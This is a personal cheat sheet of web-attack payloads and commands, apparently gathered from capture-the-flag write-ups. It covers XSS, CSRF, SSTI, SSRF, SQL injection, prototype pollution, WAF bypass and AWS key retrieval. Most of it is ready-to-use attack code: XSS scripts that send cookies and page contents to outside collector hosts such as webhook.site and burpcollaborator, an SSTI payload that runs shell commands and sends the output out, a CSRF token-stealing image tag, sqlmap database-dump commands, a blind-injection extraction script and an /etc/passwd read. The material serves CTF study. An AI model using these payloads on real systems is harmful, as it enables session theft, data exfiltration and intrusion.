# +

./javascript.md

https://github.com/swisskyrepo/PayloadsAllTheThings

https://portswigger-labs.net/hackability/inspector/index.php?input=window
[HTML Codes \- Table of ascii characters and symbols](https://ascii.cl/htmlcodes.htm)
[Unicode/UTF\-8\-character table](https://utf8-chartable.de/unicode-utf8-table.pl)

https://snyk.io/vuln/

# client information disclosure

[Webhook\.site \- Test, process and transform emails and HTTP requests](https://webhook.site/)

```python
@app.route('/', methods=['GET', 'HEAD', 'POST'])
def index():
    # e.g. Vary, Origin
    print(request.headers)
    print(request.args)
    print(json.dumps(request.json))
    return "OK"

if _name__ == "__main__":
    app.run(host='0.0.0.0', port=80, debug=True, threaded=True)
```

- `user-agent curl/7.19.3` => vulnerable version
    - https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/let_mee_see.txt

# prototype pollution

- [GitHub \- Kirill89/prototype\-pollution\-explained: Prototype Pollution in JavaScript](https://github.com/Kirill89/prototype-pollution-explained)
    - [Prototype Pollution in lodash | Snyk](https://snyk.io/vuln/SNYK-JS-LODASH-73638)
        - https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf

```html
</pre>
<script type="text/javascript">
RegExp = function() {
    return {'test' : function(){
        return true;
    }}
}
</script>
<input type="text" id="secretbox" value="nop" />
<script id="bla" src="http://challs.ctf.site:10000/safebox/file.js" type="text/javascript" onload="document.location.href='http://doma.in/?s='+document.getElementById('secretbox').value;"></script>
```

Proxy object:

```javascript
RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
          apply: function(target, thisArg, argumentsList) {
              console.log(thisArg.source);
              console.log(argumentsList[0]);
              if((thisArg.source == '^file:\\/\\/.+') && (argumentsList[0] === 'file:///Applications/Calculator.app')){
                return false;
              }
              return Reflect.apply(target, thisArg, argumentsList)
          }
        });
        setTimeout(()=>{
            a = document.createElement("A")
            a.href="file:///Applications/Calculator.app"
            document.body.appendChild(a)
            a.click()
        }, 3000);
```
    - https://blog.redteam.pl/2020/08/rocket-chat-xss-rce-cve-2020-15926.html
    - [#276031 Remote Code Execution in Rocket.Chat Desktop - HackerOne](https://hackerone.com/reports/276031)

# DOM clobbering

- https://xss.pwnfunction.com/challenges/ww3/
    - https://www.anquanke.com/post/id/197614
    - http://retanoj.github.io/2020/04/18/%E9%A2%98%E7%9B%AE-XSS-2020-04-18-XSS-game-of-pwnfunction-Challenges-WW3/
    - text = `<a><style><style/><script>alert(1337);//</style><form name=notify>`

# cross-site request forgery (CSRF)

- [Multiple vulnerabilities that can result in RCE · Issue \#1122 · Codiad/Codiad · GitHub](https://github.com/Codiad/Codiad/issues/1122)

```html
<img src="http://generateerror.com/does-not-exist.jpg" onerror="javascript:var all_inputs = document.getElementsByTagName('input'); var token = '';for(var i = 0; i < all_inputs.length; i++){if (all_inputs[i].name == 'csrftoken'){token = all_inputs[i].value;}}var iframe = document.createElement('iframe');iframe.src = 'http://ctf.nullcon.net/challenges/web/web4/set_admin.php?user=pepe&csrftoken=' + token + '&Set=Set';document.body.appendChild(iframe);"/>
```

# server-side template injection (SSTI)

```html
<script>
// Payload: {{ ''.class_.__mro__[1].__subclasses__()[412]("cat server.py", shell=True, stdout=-1).communicate() }}
fetch('http://localhost:5000/',{
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: "url=1&score=1&feedback=%7B%7B%20%27%27.__class__.__ mro__%5B1%5D.__ subclasses__%2829%5B412%5D%28%22cat%20server.py%22%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%20%7D%7D&nam=1"}).then(response => response.text()).then(data => fetch("http://demo.itmo.xyz/?nnn="+encodeURI(data)).then(response => document.write(response)));
</script>
```

# server-side request forgery (SSRF)

- Headers
    - X-Forwarded-For: 127.0.0.1
- Request URL with CRLF + Headers
    - http://109.233.61.11:27280/?retpath=/news/%0d%0aX-Accel-Redirect:%20/secret/flag
        - https://www.tasteless.eu/post/2014/02/olympic-ctf-sochi-2014-xnginx-writeup/
- https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

```bash
curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.0.0.1/?url=http://daffy-malleable-tote.glitch.me/go'
```
- https://glitch.com
    ```javascript
    const express = require("express");
    const app = express();

    app.get("/", (request, response) => {
      response.redirect(301, 'file:///flag.txt')
    });

    const listener = app.listen(process.env.PORT, () => {
      console.log("Your app is listening on port " + listener.address().port);
    });
    ```
- https://pipedream.com/
    - https://docs.pipedream.com/workflows/steps/code/#making-http-requests-from-your-workflow
    - Workflow = HTTP trigger > NodeJS
    ```javascript
    async(event, steps) => {
        $respond({
          status: 301,
          headers: { "Location": "file:///flag.txt" }
        });
    }
    ```
- https://www.netlify.com/blog/2018/09/13/how-to-run-express.js-apps-with-netlify-functions/
- https://devcenter.heroku.com/articles/getting-started-with-nodejs

### Reverse DNS checks

- substring: ctf_host.com.127.0.0.1.attacker_domain.com
- lookup: ctf_host.com.attacker_domain.com resolves to 127.0.0.1
- request: https://ctf_host.com@127.0.0.1/foo

### DNS Rebind

- [DnsFookup](http://rbnd.gl0.eu/dnsbin)
    - record type = A; IP = 93.184.216.34; Repeat = 1
    - record type = A; IP = 127.0.0.1; Repeat = 1

# request smuggling

https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c

# directory traversal

- writing arbitrary files
    - [extraction path](./forensics.md#extraction-path)

- [Directory Traversal in st | Snyk \- Open Source Security](https://snyk.io/vuln/SNYK-JS-MINHTTPSERVER-608658)
    - https://blog.npmjs.org/post/80277229932/newly-paranoid-maintainers
    - ~/Downloads/st-20140206_0_0_6b54ce2d2fb912eadd31e2c25c65456d2c8666e1.patch

# Cross-Site Scripting (XSS)

- ~/code/snippets/ctf/web/injections.js
- ~/code/snippets/ctf/web/xmlrequest.js

- https://netsec.expert/2020/02/01/xss-in-2020.html
- https://security.stackexchange.com/questions/162436/example-of-reflected-client-xss-which-is-not-dom-based-xss

```html
<!-- DOM-Based -->
'"><img src=https://foo>

'"><script>
xmlhttp = new XMLHttpRequest();
xmlhttp.onload = function() {
    x = new XMLHttpRequest();
    x.open('GET', 'https://webhook.site/OF728FeO-d6d8-4195-a627-F80F4Fd8b92d?' + btoa(xmlhttp.response));
    x.send(null);
    //document.write("<img src='https://webhook.site/OF728FeO-d6d8-4195-a627-F80F4Fd8b92d?" + btoa(xmlhttp.responseText) + "'>");
}
xmlhttp.open('GET', '/admin');
xmlhttp.send(null);
</script>

<!-- Vanilla -->
nc -lvp 1000 | tee log.txt
<script> var xhr = new XMLHttpRequest(); xhr.open('GET', "http://johnhammond.org:1000/?content=" + btoa(document.body.InnerHTML), true); xhr.send(); </script>
<script>
xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function() {
    document.location="http://vps_ip:23334/?"+btoa(xmlhttp.responseText);
}
xmlhttp.open("GET","http://127.0.0.1:5000/notes?name=Ann Cobb", true);
xmlhttp.send();
</script>

<!-- jQuery -->
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.js'></script><script> var x = $('body').html().toString(); $.post('http://foo/catcher.php', x); </script>

<!-- ES6 -->
<script>fetch('https://webhook.site/OF728FeO-d6d8-4195-a627-F80F4Fd8b92d?' + btoa(document.cookie));</script>
<script>
fetch('http://localhost:5000/notes?name=Angela%20Turner').then(response => response.text()).then(
data => fetch("http://demo.itmo.xyz", {
    method: "POST", 
    headers: {
        'Content-Type': 'application/json'
    },"body": JSON.stringify(data)})).then(response => document.write(response));
</script>
```

LFI:

```html
<script>
var xhr = new XMLHttpRequest;
xhr.onload = function() {
	document.write(this.responseText);
};
xhr.open("GET", "file:///etc/passwd");
xhr.send();
</script>
```

- https://github.com/snovvcrash/cheatsheets#xss

Mitigations:

- [Using HTTP cookies \- HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Security)
    - Set-Cookie header
        - SameSite - cookie not sent via cross-origin requests
        - Secure - cookie sent strictly via https
        - HttpOnly - cookie not accessible in js
            - bypass: server-side debug info logging
            ```html
            <?php header("Set-Cookie: SESSIONID=ImAhttpOnlyCookie; path=/; httponly"); ?>
            <a href='phpinfo.php'>aa</a>
            ```
            ~/code/guides/ctf/WebBook/HTTP/XSS学习.md
- [Content Security Policy \(CSP\) \- HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
    - bypass: using valid elements/attributes
        - `default-src 'self'; script-src 'self' foo.bar.com 'unsafe-inline';` => `<link rel=prefetch href=//bar.com`
        - `<script>//# sourceMappingURL=https://request/?${escape(document.cookie)}</script>`
            - [Bypass unsafe\-inline mode CSP](https://paper.seebug.org/91/)

Polyglots:

```svg
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="100px" height="100px" viewBox="0 0 751 751" enable-background="new 0 0 751 751" xml:space="preserve">  <image id="image0" width="751" height="751" x="0" y="0"
    href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo" />
<script>alert(1)</script>
</svg>

<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="Layer_1" x="0px" y="0px" width="100px" height="100px" viewBox="-12.5 -12.5 100 100" xml:space="preserve"> 
  ...
  <g>
    <polygon fill="#00B0D9" points="41.5,40 38.7,39.2 38.7,47.1 41.5,47.1 "></polygon>
    <script type="text/javascript">
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          var xhr2 = new XMLHttpRequest();
          xhr2.open("POST", "http://XXXX.burpcollaborator.net/");
          xhr2.send(xhr.responseText);
        }
      }   
      xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");
      xhr.withCredentials = true;
      xhr.send();
    </script>
  </g>
  ...
</svg>
```

- [CONFidence CTF 2019\-Web 50分析思考 &\#8211; 郁离歌丶的博客](http://yulige.top/?p=665)
    - [SVG XSS的一个黑魔法 · Tuuu Nya&\#39;s Blog](https://www.hackersb.cn/hacker/85.html)

```bash
exiftool -make "<script>document.location='http://burpcollaboratoridoryourserver?c='+document.cookie</script>" imagefinal.jpg
```
    - https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/web-Imgr.txt

# SQL Injection (SQLI)

```sql
-- ' or 1=1 UNION SELECT database(),1 #
-- ' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = '' #

-- User-Agent: ' or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(1) #
-- User-Agent: ' or 1 group by concat_ws(0x3a,(select group_concat(table_name separator ',') from information_schema.tables where table_schema=database()),floor(rand(0)*2)) having min(1) #

-- %" UNION SELECT "one", "two"; --%";
-- %" AND username in (SELECT username FROM sqlite_master where username like "%") --

-- WAF detection
-- 9495 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
```

```bash
sqlmap -u "http://joking.bitsctf.bits-quark.org/index.php" --data="id=1&submit1=submit" -D hack -T Joker -C Flag --dump
sqlmap -u "http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/login.php" --csrf-token="user_token" --csrf-url="http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/" --data="username=a&password=a&Login=Login&user_token=" --dump
sqlmap -r seccon.txt  --ignore-401 --dbs --proxy=http://127.0.0.1:8080
sqlmap -r seccon.txt  --ignore-401 --hex --tables -D keiba --proxy=http://127.0.0.1:8080

# String delimiter sqli
sqlmap.py -u http://ctf.sharif.edu:8086/ --method=POST --data="book_selection=a" --cookie="PHPSESSID=my_sess_id" --prefix="9780060878849\'" --technique B --dbms=MySQL --risk=3 --string covers -D book_shop -T books -C book_serial --dump

# Boolean-based blind sqli
sqlmap.py -u http://ctf.sharif.edu:8082/login.php --method=POST --data="username=a&password=b" -p username --technique=B --string injection --dbms=MySQL --risk=3 -D irish_home -T users --dump --prefix="aa\""
```

Replace spaces with parenthesis:

```python
import requests
import string

session = requests.session()
url = "http://202.120.7.197/app.php"
cookie = {"PHPSESSID": "ck8pgb52nkkb8sdg2c95ms7s16"}
flag = ""

for i in xrange(1, 50):
    for j in string.printable:
        if j == "%": continue
        param = {"action": "search", "keyword": "", "order": "if(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),{length},1)like({num}),price,name)".format(length=str(i), num=hex(ord(j)))}
        # print param
        res = session.get(url=url, params=param, cookies=cookie)
        content = res.text
        # print content
        if content.find("\"id\":\"5\"") > content.find("\"id\":\"2\""):
            print j
            flag += j
            print flag
            break
```
    - https://www.40huo.cn/blog/0ctf-2017-writeup.html

- https://medium.com/@gregIT/ringzer0team-ctf-sqli-challenges-part-2-b816ef9424cc

# code injection

On: state persisted as objects (e.g. cookie)

```
j:[{"id":1,"body":__FILE__}]
j:[{"id":1,"body":["foo'"]}]
```
    - https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#dusty-notes
        - https://artsploit.blogspot.com/2016/08/pprce2.html

# deserialization

- https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html
- https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-608664
- https://blog.orange.tw/2020/09/how-i-hacked-facebook-again-mobileiron-mdm-rce.html
- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet

# command injection 

```
filename="'$(sleep 5)'a.gif"
```

- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- [#863956 \[extra-asciinema\] Command Injection via insecure command formatting](https://hackerone.com/reports/863956)
    - [Avoid\-Command\-Injection\-Node\.md · GitHub](https://gist.github.com/evilpacket/5a9655c752982faf7c4ec6450c1cbf1b)

# side channels

- https://snyk.io/blog/node-js-timing-attack-ccc-ctf/

# jail, filter bypass, waf

- jsfuck
- `__defineGetter__`
    - https://hack.more.systems/writeup/2014/10/26/hacklu2014-objection/
- https://mathiasbynens.be/notes/javascript-escapes
- alternative for `()`
    ```javascript
    alert`1337`in``.sub﻿in''instanceof""
    ```
    - https://portswigger.net/research/javascript
- php, non alphanumeric
    - https://github.com/ExTi0p/ctf/tree/master/2020/FwordCTF_2020/Jailoo_Warmup
    - https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/
- Content-Type, multipart parsing
    ```
    Content-Type: application/x-www-form-urlencoded;/json
    {"q":"' \u0075nion \u0073elect '1"}
    ```
    - https://github.com/BlackFan/content-type-research
    - https://soroush.secproject.com/blog/2018/08/waf-bypass-techniques-using-http-standard-and-web-servers-behaviour/
    - https://blog.doyensec.com/2020/08/20/playframework-csrf-bypass.html
- DNS tunnel
    - https://github.com/iagox86/dnscat2

```javascript
// == "Hello World!"
/Hello W/.source+/ordl!/.source 
```

```bash
# Enumerate blocked chars
# Alternative: Burp Intruder
for n in {32..127}; do
    c=$(awk '{ printf("%c", $0); }' <<< $n)
    echo "$c"
    curl 'http://foo/' --data-raw 'cmd='"$c"'&submit=' | grep -E '(< HTTP)|error|success'
done 2>/dev/null | vim -
```

# wasm

https://teamrocketist.github.io/2019/12/30/Reverse-36c3-xmas-future/
https://klatz.co/ctf-blog/boilerctf-alien-tech

# aws

```bash
# take aws domain name
dig foo
# take version id header
curl -v 'http://foo.s3-website-us-east-1.amazonaws.com/bar'
# take version id
curl -v 'https://foo.s3.amazonaws.com/?versions&prefix=bar'
# take access keys
curl -v 'https://foo.s3.amazonaws.com/bar?versionId=zcoAvy97sFgFdR08.kypq1KyLj9iZuAD'
aws s3api get-object --bucket foo --key bar bar
```
    - https://0day.work/balccon2k20-ctf-let-me-see-and-dawsonite-writeups/
